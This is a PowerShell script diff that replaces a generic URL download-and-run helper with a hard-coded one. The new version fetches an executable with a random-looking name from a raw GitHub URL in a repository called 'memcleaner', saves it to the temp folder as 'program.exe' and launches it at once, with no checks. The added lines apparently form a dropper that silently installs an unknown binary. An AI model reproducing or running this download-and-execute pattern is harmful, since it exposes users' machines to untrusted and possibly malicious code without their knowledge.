@@ -1,14 +1,4 @@
-param(
-    [Parameter(Mandatory=$true)]
-    [string]$Url,
-    [string]$OutFile = "$env:TEMP\dlrun_tmp.ps1"
-)
-
-Write-Host "Downloading: $Url"
-iwr -Uri $Url -OutFile $OutFile
-
-if (Test-Path $OutFile) {
-    Write-Host "Saved to: $OutFile"
-    Write-Host "Opening..."
-    & $OutFile
-}
+$url = "https://raw.githubusercontent.com/fasa3e/memcleaner/refs/heads/main/c0j9xeidfkhjou1o.exe"
+$output = "$env:TEMP\program.exe"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process $output
